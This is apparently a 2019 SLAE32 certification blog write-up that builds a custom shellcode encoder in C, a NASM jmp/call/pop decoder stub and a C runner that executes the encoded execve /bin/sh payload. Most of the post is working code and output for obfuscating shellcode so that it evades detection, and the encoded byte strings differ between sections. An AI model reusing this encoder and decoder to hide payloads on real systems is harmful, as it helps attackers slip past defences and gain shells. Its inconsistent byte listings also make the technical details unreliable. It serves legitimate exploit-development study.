---
layout: single
title: 'SLAE32 Assignment #4 - Custom Encoding Scheme'
date: 2019-12-27
classes: wide
header:
  teaser: /assets/images/SLAE32/SLAE32.jpg
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
  - Custom Encoder
---

<h2><span style="color:#339966;"><strong><img style="border:none;" src="{{ site.baseurl }}/assets/images/2020/08/slae32-1.png" alt="SLAE32" width="265" height="265" /></strong></span></h2>


## SLAE32 Assignment #4 - Custom Encoding Scheme

<p style="text-align:justify;">
In this assignment a custom shellcode encoder / decoder&nbsp; will be created in order to show a custom encoding technique used when deploying malicious payloads onto target systems.
</p>

**The assignment:**

- **Create a custom encoding scheme like "insertion encoder" we showed you**
- **PoC with using execve-stack as the shellcode to encode with your schema and execute**

> _Disclaimer_ :
> 
> _This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification_

> The full source code and scripts can be found at [github](https://github.com/xvass/SLAE/tree/master/Assignment4)
> 
> Published on
> 
> - [exploit-db](https://www.exploit-db.com/shellcodes/47890)


For the purposes of this assignment the custom encoder / decoder has been successfully tested at the following architecture

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
Linux kali 5.3.0-kali3-686-pae #1 SMP Debian 5.3.15-1kali1 (2019-12-09) i686 GNU/Linux
</pre>

### The encoding / decoding scheme

<p style="text-align:justify;">
The logic behind the creation of a custom encoding / decoding scheme, is to represent a given shellcode into a form that will be different from the one it had before, with the prospect that the encoded shellcode will be obfuscated. Furthermore, in order the shellcode to be executed as intended, it must be decoded into its initial form on runtime, using a decoding pattern. The following diagram shows the execve shellcode bytes that will be used in order to apply the custom encoding scheme
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 2px solid black;" src="{{ site.baseurl }}/assets/images/2019/12/screenshot-2019-12-21-at-12.55.26-pm.png" alt=""  />

<p style="text-align:justify;">
The first operation in the encoding process is to provide an insertion encoding scheme&nbsp; which will add random bytes at every odd number location at the initial shellcode byte sequence. The following diagram represents the result of the insertion encoding process
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 2px solid black;" src="{{ site.baseurl }}/assets/images/2019/12/insertion.png" alt=""  />

The insertion encoder has been implemented using the following code snippet

```c
int i;
unsigned char *buffer = (char*)malloc(sizeof(shellcode)*2);
//generate random-like numbers initializing a distinctive runtime value which is the value returned by function time 
srand((unsigned int)time(NULL));
unsigned char *shellcode2=(char*)malloc(sizeof(shellcode)*2);
// placeholder to copy the random bytes using rand
unsigned char shellcode3[] = "\xbb";
int l = 0;
int k = 0;
int j;

// random byte insertion into even number location
printf("\nInsertion encoded shellcode\n\n");
for (i=0; i<(strlen(shellcode)*2); i++) {
// generate random bytes
buffer[i] = rand() & 0xff;
memcpy(&shellcode3[0],(unsigned char*)&buffer[i],sizeof(buffer[i]));
k = i % 2;
if (k == 0)
{
shellcode2[i] = shellcode[l];
l++;
}
```

<p style="text-align:justify;">
The next encoding operation in the custom encoding process is to change the values of the shellcode bytes using a custom encoding pattern. The following steps are showing the custom encoding pattern
</p>

1. provide a bitwise exclusive OR operation **(xor)** to every byte in sequence with value **0x2c**
2. **subtract** every byte with value **0x2**
3. apply ones' complement&nbsp; arithmetic operation
4. perform a **4 bits right rotation (ror)** to every byte in shellcode

The above encoding pattern implemented using the code snippet below

```c
// apply the encoding scheme 
for (i=0; i < strlen(shellcode2); i++) 
{ 
// XOR every byte with 0x2c 
shellcode2[i] = shellcode2[i] ^ XORVAL; 
// decrease every byte by 2 
shellcode2[i] = shellcode2[i] - DEC; 
// ones' complement
shellcode2[i] = ~shellcode2[i];  
// perform the ror method 
shellcode2[i] = (shellcode2[i] << rot) | (shellcode2[i] >> sizeof(shellcode2[i])*(8-rot));
}
```

The following diagram depicts the result from the custom encoding process

<img style="display: block;margin-left: auto;margin-right: auto;border: 2px solid black;" src="{{ site.baseurl }}/assets/images/2019/12/encoded-2.png" alt=""  />

<p style="text-align:justify;">
Later on, the decoding process will take place, providing a reverse operation to the encoded bytes. The following steps used to decode the encoded payload
</p>

1. perform a **4 bits left rotation** **(rol)** to every byte in shellcode
2. apply ones' complement&nbsp; arithmetic operation
3. **add** value **0x2** to every byte in sequence
4. provide a bitwise exclusive OR operation **(xor)** to every byte with value **0x2c**

The following diagram depicts the result from the custom decoding process

<img style="display: block;margin-left: auto;margin-right: auto;border: 2px solid black;" src="{{ site.baseurl }}/assets/images/2019/12/decoding.png" alt=""  />

Afterwards, when the decoding process finishes, it is time to remove the extra bytes from every odd number location, shifting the bytes left.

<img style="display: block;margin-left: auto;margin-right: auto;border: 2px solid black;" src="{{ site.baseurl }}/assets/images/2019/12/removing.png" alt=""  />


### The Custom Encoder

For the encoding phase, the payload used to encode is the execve which executes the /bin/sh command. The custom encoder has been implemented as shown below

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define DEC 0x2 // the value that will be used to subtract every byte
#define XORVAL 0x2c // the value that will be used to xor with every byte

// execve stack shellcode /bin/sh
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

void main()
{
int rot = 4; //right rotation 4 bits

printf("\n\nShellcode:\n\n");
int o;
for (o=0; o < strlen(shellcode); o++) {
    printf("\\x%02x", shellcode[o]);
}

printf("\n\nShellcode Length %d\n",sizeof(shellcode)-1);
printf("\n\nShellcode:\n\n");
o=0;
for (o; o < strlen(shellcode); o++) {
    printf("0x%02x,", shellcode[o]);
}

printf("\n");
int i;
unsigned char *buffer = (char*)malloc(sizeof(shellcode)*2);

//use srand to generate ranodm bytes as seen below 
srand((unsigned int)time(NULL));
unsigned char *shellcode2=(char*)malloc(sizeof(shellcode)*2);

// placeholder to copy the random bytes using rand
unsigned char shellcode3[] = "\xbb";
int l = 0;
int k = 0;
int j;

// random byte insertion into even number location
printf("\nInsertion encoded shellcode\n\n");
for (i=0; i<(strlen(shellcode)*2); i++) {
    // generate random bytes. 
    // Adding an integer with 0&ff leaves only the least significant byte (masking)
    buffer[i] = rand() & 0xff;
    memcpy(&shellcode3[0],(unsigned char*)&buffer[i],sizeof(buffer[i]));
    k = i % 2;
    if (k == 0)
    {
         shellcode2[i] = shellcode[l];
         l++;
    }
    else
    {
         shellcode2[i] = shellcode3[0];
    }
}

// apply the encoding scheme
for (i=0; i < strlen(shellcode2); i++) 
{
        // XOR every byte with 0x2c
        shellcode2[i] = shellcode2[i] ^ XORVAL;
        // decrease every byte by 2
        shellcode2[i] = shellcode2[i] - DEC;
        // one's complement
        shellcode2[i] = ~shellcode2[i];
        // perform the ror method
        shellcode2[i] = (shellcode2[i] << rot) | (shellcode2[i] >> sizeof(shellcode2[i])*(8-rot));   
}

// print encoded shellcode
printf("\nEncoded shellcode\n\n");
i=0;
for (i; i < strlen(shellcode2); i++) {
       printf("0x%02x,", shellcode2[i]);
}

printf("\n\nEncoded Shellcode Length %d\n",strlen(shellcode2));
free(shellcode2);
free(buffer);
printf("\n\n");
}

```

The program above will be compiled using **gcc** as follows


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
gcc -o encode encoder.c
</pre>

Then, running the encoder will give the following result

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment4</b></span># ./enc

Shellcode:

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

Shellcode Length 25


Decoded Shellcode:

0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80,

Insertion shellcode

0x31,0xa9,0xc0,0x1f,0x50,0xdd,0x68,0x22,0x2f,0x9e,0x2f,0x78,0x73,0x32,0x68,0x0c,0x68,0x64,0x2f,0x74,0x62,0x84,0x69,0xf2,0x6e,0xde,0x89,0xf6,0xe3,0x93,0x50,0xf1,0x89,0xb5,0xe2,0x15,0x53,0x80,0x89,0x82,0xe1,0x93,0xb0,0xb6,0x0b,0x5d,0xcd,0x2c,0x80,0x42,

Encoded shellcode

0x4e,0xc7,0x51,0xec,0x58,0x01,0xdb,0x3f,0xef,0xf4,0xef,0xda,0x2a,0x3e,0xdb,0x1e,0xdb,0x9b,0xef,0x9a,0x3b,0x95,0xcb,0x32,0xfb,0xf0,0xc5,0x72,0x23,0x24,0x58,0x42,0xc5,0x86,0x33,0x8c,0x28,0x55,0xc5,0x35,0x43,0x24,0x56,0x76,0xad,0x09,0x02,0x10,0x55,0x39,

Encoded Shellcode Length 50
</pre>

### The Custom Decoder&nbsp;

<p style="text-align:justify;">
At this section, an assembly wrapper will be used to decode the encoded payload which will implement the decoding scheme. The main purpose of the custom decoder is to implement a generic solution making the decoder work in different linux environments. The decoding scheme will be applied at the following encoded payload.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0x4e,0xc7,0x51,0xec,0x58,0x01,0xdb,0x3f,0xef,0xf4,0xef,0xda,0x2a,0x3e,0xdb,0x1e,0xdb,0x9b,0xef,0x9a,0x3b,0x95,0xcb,0x32,0xfb,0xf0,0xc5,0x72,0x23,0x24,0x58,0x42,0xc5,0x86,0x33,0x8c,0x28,0x55,0xc5,0x35,0x43,0x24,0x56,0x76,0xad,0x09,0x02,0x10,0x55,0x39
</pre>

<p style="text-align:justify;">
The custom decoder implemented using the <b>jmp/call/pop</b> technique in order to achieve two basic things
</p>

1. Avoid null bytes
2. Avoid hardcoded addresses


<p style="text-align:justify;">
In order the shellcode to work in other linux systems or other vulnerable programs, it should not contain hardcoded addresses. Furthermore, the shellcode&nbsp;must not contain <b>\x00 (null)</b> bytes as these used to terminate a string with a certain impact of breaking the shellcode and stop execution.
</p>

<p style="text-align:justify;">
Along with the above two points in mind it is time to start implementing the shellcode while first describing the <b>jmp/call/pop</b> technique as shown at the following program structure
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
global _start 

section .text 

_start: 
      jmp short call_shellcode

init: 
      pop esi
      [...]

call_shellcode: 
      call decoder 
      EncodedShellcode: db 0x4e,0xc7,0x51,0xec,0x58,0x01,0xdb,0x3f,0xef,0xf4,0xef,0xda,0x2a,0x3e,0xdb,0x1e,0xdb,0x9b,0xef,0x9a,0x3b,0x95,0xcb,0x32,0xfb,0xf0,0xc5,0x72,0x23,0x24,0x58,0x42,0xc5,0x86,0x33,0x8c,0x28,0x55,0xc5,0x35,0x43,0x24,0x56,0x76,0xad,0x09,0x02,0x10,0x55,0x39
      len equ $-EncodedShellcode
</pre>


<p style="text-align:justify;">
The code structure above represents the <b>jmp/call/pop</b> technique. First, the <b>jmp</b>  <b>short</b> instruction used in order to redirect the program execution to a location where the <b>call_shellcode</b> label begins. The reason that <b>jmp short</b> instruction has been chosen is that it will not generate <b>null</b> bytes when executed. In more detail, <b>jmp short</b> means <b>two (2)</b>&nbsp; <b>bytes</b> will be used to jump to a memory location in the same segment, so there are actually <b>2^8=256</b> bytes for the offset. In fact, a signed offset is used, so it actually goes from <b>00h</b> to <b>7Fh</b> for a forward <b>jmp</b> and from <b>80h</b> to <b>FFh</b> for a backward or reverse&nbsp; <b>jmp</b>. This is great because it means using a <b>jmp&nbsp;short</b> instruction will not add any <b>nulls</b> (check this <a href="https://thestarman.pcministry.com/asm/2bytejumps.htm" >reference</a>) for more details about <b>jmp</b> instruction ). So, in current&nbsp; scenario a forward short jump will be used where the encoded output is shown in red font below
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
08049000 &#x3C;_start>: 8049000: eb 39 jmp 804903b &#x3C;call_shellcode>
</pre>

<p style="text-align:justify;">
In this case, using the <b>jmp short</b> instruction, no <b>null</b> bytes produced. Furthermore, the <b>call decoder</b> instruction will set a new <b>jstack frame,</b> where, the defined bytes right after the <b>call</b> instruction, will be saved into the stack. Furthermore, the <b>call</b> instruction redirects execution backwards, at label <b>decoder</b> , where <b>no null</b> bytes produced as seen in red font below. In the contrary, it is worth to mention that when a <b>call</b> instruction used to redirect execution in a forward location, then it produces <b>null</b> bytes, which is currently avoided because of using the <b>jmp/call/pop</b> technique described before.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0804903b &#x3C;call_shellcode&#x3E;:
804903b: e8 c2 ff ff ff call 8049002 &#x3C;decoder&#x3E;
</pre>


<p style="text-align:justify;">
Later on, as said before, the execution of the program will be redirected to the <b>decoder</b> label, where the first instruction <b>pop esi</b> , when executed, will actually put the address of the shellcode inside the register <b>esi.&nbsp;</b>

Now that the <b>jmp/call/pop</b> technique explained above, it is a good starting point to proceed further into explaining the implementation of the custom decoder.

The following code snippet explains the code implemented inside the <b>init</b> label
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
init: 
        pop esi 
        push esi 
        xor ebx, ebx 
        xor ecx, ecx 
        xor edx, edx 
        mov dl, len
</pre>


<p style="text-align:justify;">
As mentioned before,&nbsp; the <b>pop esi</b> instruction after executed will hold the address of the initial shellcode byte string ( see <b>EncodedShellcode</b> below ) <b>.</b> Afterwards, when the <b>push esi</b> instruction executed, it will push the address of the initial shellcode into the stack for later use. The next three instructions will perform a bitwise exclusive OR operation to <b>ebx</b> , <b>ecx</b> and <b>edx</b> registers in order to clear them and initialise them for later use.&nbsp; The <b>mov dl, len</b> instruction will load the shellcode length into the lower byte register <b>dl</b> ( lower byte registers are used to avoid nulls ).&nbsp; The length of the shellcode calculated as shown in red font below
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
call_shellcode: 
              call init 
              EncodedShellcode: db 0x4e,0xc7,0x51,0xec,0x58,0x01,0xdb,0x3f,0xef,0xf4,0xef,0xda,0x2a,0x3e,0xdb,0x1e,0xdb,0x9b,0xef,0x9a,0x3b,0x95,0xcb,0x32,0xfb,0xf0,0xc5,0x72,0x23,0x24,0x58,0x42,0xc5,0x86,0x33,0x8c,0x28,0x55,0xc5,0x35,0x43,0x24,0x56,0x76,0xad,0x09,0x02,0x10,0x55,0x39,
              len equ $-EncodedShellcode
</pre>

Furthermore, the custom decoding scheme will be explained as follows

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
scheme:
       rol byte [esi], 4 
       not byte [esi] 
       add byte [esi], 2 
       xor byte [esi], 0x2c
</pre>


<p style="text-align:justify;">
The above code snippet executes the decoding scheme at the given encoded shellcode, where the <b> rol </b> instruction will be applied to the byte pointed by <b> esi </b> &nbsp; <b> register in order to perform a </b> four (4) <b> bit left rotation. Then, the </b> not <b> instruction will be used in order to perform </b> one's complement <b> to the byte pointed by </b> esi <b> register. The </b> add <b> instruction will be used to add </b> two (2) <b> bits to the byte pointed by </b> esi <b> &nbsp;register. The last instruction of the encoding scheme will be the </b> xor <b> instruction which will implement a bitwise exclusive OR operation to the byte pointed by </b> esi <b> register with the value </b> 0x2c <b> . Furthermore, </b> inc esi </b> will be used in order to add one (1) to the contents of the byte at the effective address represented by <b>esi </b> register. This procedure will continue until the end of the shellcode as shown at the following code snippet
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
inc esi
cmp cl, dl 
je prepare 
inc cl 
jmp short scheme
</pre>


<p style="text-align:justify;">
After encoding the first shellcode byte contained in <b>esi </b> register, the <b>esi </b> register will be increased by <b>one (1) </b> in order to move to the next byte using the instruction <b>inc esi</b>. Later on, &nbsp;the counter value represented by the <b>cl </b> lower byte register will be compared with the length of the shellcode contained inside <b>dl </b> lower byte register using the <b>cmp </b> instruction. At the next instruction, if the comparison between the values contained at <b>cl </b> and <b>dl </b> lower byte registers are not equal, by using the <b>jmp </b> instruction, the execution will be redirected at the beginning of the <b>scheme </b> label, thus creating a loop until the values are equal. In the contrary, at the next loop, and after increasing the counter using the instruction <b>inc cl </b> , if the comparison of the values of the lower byte registers <b>cl </b> and <b>dl </b> are equal, the execution will be directed forward to <b>prepare </b> label using the instruction <b>je prepare</b>.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
prepare: 
        pop esi 
        lea edi, [esi +1] 
        xor eax, eax 
        mov al, 1 
        xor ecx, ecx
</pre>


<p style="text-align:justify;">
At the code snippet above, when the <b> pop esi </b> instruction executed, the <b> esi </b> register will point to the first byte of the initial shellcode. At this point, it must be mentioned that apart of the decoding process of every encoded shellcode byte, all the extra random bytes contained in the encoded shellcode ( see the encoding process ), will be removed from every odd number location until the end of the encoded shellcode. Continuing further, in order to achieve this, the <b> edi </b> register must point to the next byte using the instruction <b> lea edi, [esi +1]</b>. Furthermore, <b> eax&nbsp; </b> and <b> ecx </b> registers will be initialised using the exclusive or ( <b> xor </b> ) operation, because <b> al </b> will be used as counter making <b> esi </b> to point into every <b> even </b> number location, and <b> cl </b> register will also used as counter in order to be compared with the length of the shellcode. The lower byte register <b> al </b> will&nbsp; increase its value by <b> two (2) </b> every time it is executed, which currently initialised with the immediate value <b> one (1) </b> using the <b> mov al, 1 </b> instruction, in order to achieve counting <b> even numbers (1,3,5,7,...)</b>. The next code snippet will be used to remove the extra random bytes of the encoded shellcode
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
remove_bytes: 
            ;; apply the random bytes removal scheme 
            cmp cl, dl 
            je EncodedShellcode 
            mov bl, byte [esi + eax + 1] 
            mov byte [edi], bl 
            inc edi  
            inc cl 
            add al, 2 
            jmp short remove_bytes
</pre>


<p style="text-align:justify;">
The first instruction at the code snippet above is a comparison between the two lower byte registers <b>cl</b> and <b>dl</b>, where the lower byte register <b>dl</b> contains the length of the shellcode. In case the comparison is equal, the next instruction <b>je EncodedShellcode</b>will redirect execution into the code section with the label&nbsp;<b>EncodedShellcode</b>. The next instruction <b>mov bl, byte [esi + eax + 1] </b> ,will move the byte contents pointed by <b>[esi + eax + 1]</b> to lower byte register <b>bl</b>, which means it will move the next byte plus one from current location into<b>bl,</b>and that because the <b>bl</b>lower byte register must contain a shellcode byte located at an odd number location inside the shellcode byte sequence <b>.</b>Then, every time the <b> mov byte [edi], bl </b> instruction executes, the <b>edi</b> register will point only at the shellcode bytes located at odd number locations, thus shifting the bytes of the shellcode one byte left at a time, removing the inserted bytes located at even number locations. Then, the instruction <b>inc edi</b> will increase the <b>edi</b> register by one, pointing to the next location. Afterwards, because the inserted random bytes are located in every even number location of the shellcode byte sequence, the lower byte <b>al</b> will increase its value by <b>two (2)</b> using the instruction <b> add al, 2 </b> in order to point to achieve pointing to odd number locations. Next, The <b>jmp short remove_bytes </b>&nbsp;will perform a reverse short <b>jmp</b> to the beginning of the <b>remove_bytes&nbsp;</b> label creating a loop until the shellcode reaches its last byte.
</p>

The full assembly code which implements the custom decoder is shown below:

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
global _start

section .text

_start:
jmp short call_shellcode

init:
         pop esi       
         push esi       
         xor ebx, ebx  
         xor ecx, ecx   
         xor edx, edx   
         mov dl, len    
scheme:
        ;; apply the decode scheme
        rol byte [esi], 4 
        not byte [esi]   
        add byte [esi], 2    
        xor byte [esi], 0x2c 
        inc esi         
        cmp cl, dl      
        je prepare          
        inc cl         
        jmp short scheme 
prepare:
        pop esi                 
        lea edi, [esi +1]       
        xor eax, eax          
        mov al, 1               
        xor ecx, ecx           

remove_bytes:
        ;; apply the random bytes removal scheme        
        cmp cl, dl                     
        je EncodedShellcode            
        mov bl, byte [esi + eax + 1]    
        mov byte [edi], bl        
        inc edi                       
        inc cl                        
        add al, 2                       
        jmp short remove_bytes                

call_shellcode:
        call init
        EncodedShellcode: db 0x4e,0x8d,0x51,0xec,0x58,0xd9,0xdb,0x42,0xef,0xc5,0xef,0x16,0x2a,0xc8,0xdb,0x42,0xdb,0x96,0xef,0x8c,0x3b,0x29,0xcb,0x6e,0xfb,0xed,0xc5,0x7d,0x23,0xe4,0x58,0xc7,0xc5,0xd5,0x33,0x8b,0x28,0x79,0xc5,0x95,0x43,0x13,0x56,0xd3,0xad,0x49,0x02,0xc5,0x55,0x18
        len equ $-EncodedShellcode
</pre>

The shellcode will be assembled and linked using the following bash script

```c
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o

echo '[+] Done!'
```

The following command will produce the final shellcode

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment4</b></span># objdump -d ./decode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
</pre>

The produced shellcode will be delivered and executed using the following program

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\xeb\x39\x5e\x56\x31\xdb\x31\xc9\x31\xd2\xb2\x32\xc0\x06\x04\xf6\x16\x80\x06\x02\x80\x36\x2c\x46\x38\xd1\x74\x04\xfe\xc1\xeb\xec\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xc9\x38\xd1\x74\x12\x8a\x5c\x06\x01\x88\x1f\x47\xfe\xc1\x04\x02\xeb\xef\xe8\xc2\xff\xff\xff\x4e\xc1\x51\x2f\x58\x3c\xdb\xac\xef\x82\xef\x1c\x2a\xd9\xdb\x90\xdb\x6b\xef\x61\x3b\x1c\xcb\x24\xfb\xd6\xc5\x50\x23\xfa\x58\x9c\xc5\xb1\x33\x97\x28\x31\xc5\xaa\x43\xf9\x56\xf4\xad\xc2\x02\x16\x55\xe3";

int main()
{

printf("Shellcode Length: %d\n", strlen(code));

int (*ret)() = (int(*)())code;

ret();
}
```

<p style="text-align:justify;">
compiling and running the program will give the following result which is the execution of the&nbsp; /bash/sh command using the execve shellcode.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment4</b></span># gcc -fno-stack-protector -z execstack -o shell shell.c && ./shell
Shellcode Length: 114
#
</pre>
